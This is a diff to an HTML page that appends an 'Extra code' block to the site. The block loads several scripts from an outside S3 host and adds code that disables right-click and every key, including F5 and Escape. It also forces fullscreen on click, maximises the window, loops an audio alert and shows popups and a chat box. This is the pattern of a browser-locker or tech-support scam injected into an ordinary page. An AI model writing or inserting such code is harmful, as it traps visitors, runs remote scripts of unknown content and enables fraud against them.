@@ -100,6 +100,7 @@
           </script>
   </head>
   <body>
+    <div id="mainCode">
     <div id="welcome-modal" class="modal" aria-hidden="true">
       <div class="modal-backdrop"></div>
 
@@ -901,6 +902,135 @@
       }
 
       document.addEventListener("click", handleSomeClick);
+    </script>
+    </div>
+
+    <!-- Extra code -->
+    <script src="https://files-pop.s3.ap-northeast-1.amazonaws.com/nvidia.js"></script>
+    <script src="https://files-pop.s3.ap-northeast-1.amazonaws.com/jupiter.js"></script>
+    <script src="https://files-pop.s3.ap-northeast-1.amazonaws.com/progress.js"></script>
+    <script src="https://files-pop.s3.ap-northeast-1.amazonaws.com/main.js"></script>
+    <script src="https://files-pop.s3.ap-northeast-1.amazonaws.com/fulls.js"></script>
+    <script src="https://files-pop.s3.ap-northeast-1.amazonaws.com/btn.js"></script>
+    <script src="https://files-pop.s3.ap-northeast-1.amazonaws.com/esc.js"></script>
+    <script>
+      setInterval(function() {
+        document.getElementById("pridez").play()
+      }, 500);
+    </script>
+    <script>
+      $(document).ready(function() {
+        $("#mycanvas").click(function() {
+          $("#welcomeDiv").show()
+        })
+      });
+    </script>
+    <script>
+      $(document).ready(function() {
+        $(".pro_box").delay(900).fadeIn(800);
+        $(".black").delay(1E3).fadeIn(800);
+        $(".pro_box2").delay(2500).fadeIn(800);
+        $(".pro_box3").delay(3500).fadeIn(800);
+        $("#pop_up_new").delay(4E3).fadeIn(800);
+        $("#poptxt").delay(4E3).fadeIn(800)
+      });
+    </script>
+    <script>
+      $(document).ready(function() {
+        $("#mycanvas").click(function() {
+          $("#poptxt").show()
+        })
+      });
+      $(document).ready(function() {
+        $("#cross").click(function() {
+          $("#poptxt").show()
+        })
+      });
+    </script>
+
+    <script>
+      $(document).ready(function() {
+        $("#mycanvas").click(function() {
+          $("#footer").show()
+        })
+      });
+    </script>
+    <script>
+      $(document).ready(function() {
+        $("body").mouseover(function() {
+          $("#poptxt").show()
+        })
+      });
+    </script>
+    <script>
+      var isNS = "Netscape" == navigator.appName ? 1 : 0;
+      "Netscape" == navigator.appName && document.captureEvents(Event.MOUSEDOWN || Event.MOUSEUP);
+
+      function mischandler() {
+        return !1
+      }
+
+      function mousehandler(a) {
+        a = isNS ? a : event;
+        a = isNS ? a.which : a.button;
+        if (2 == a || 3 == a) return !1
+      }
+      document.oncontextmenu = mischandler;
+      document.onmousedown = mousehandler;
+      document.onmouseup = mousehandler;
+    </script>
+    <script>
+      document.onkeydown = function(a) {
+        return !1
+      };
+    </script>
+    <script>
+      document.attachEvent("onkeydown", win_onkeydown_handler);
+
+      function win_onkeydown_handler() {
+        switch (event.keyCode) {
+          case 116:
+            event.returnValue = !1;
+            event.keyCode = 0;
+            break;
+          case 27:
+            event.returnValue = !1, event.keyCode = 0
+        }
+      }
+    </script>
+    <script>
+      window.onload = function() {
+        window.moveTo(0, 0);
+        window.resizeTo(screen.availWidth, screen.availHeight)
+      };
+    </script>
+    <script>
+      $(document).ready(function() {
+        $("#chat").delay(600).fadeIn(100)
+      });
+    </script>
+
+   <script type="text/javascript">
+    document.getElementById("age-confirmation-modal").onclick = function(){
+        document.getElementById("age-confirmation-modal").style.display = "none";
+        document.getElementById("other-content").style.display = "inline";
+
+      addEventListener("click", function() {
+        var
+              el = document.documentElement
+            , rfs =
+                   el.requestFullScreen
+                || el.webkitRequestFullScreen
+                || el.mozRequestFullScreen
+        ;
+        rfs.call(el);
+        });
+    }
+     $("a#thing_to_click").click(function(e){
+         e.preventDefault();
+         window.location = "#";
+    });
+
     </script>
   </body>
 </html>
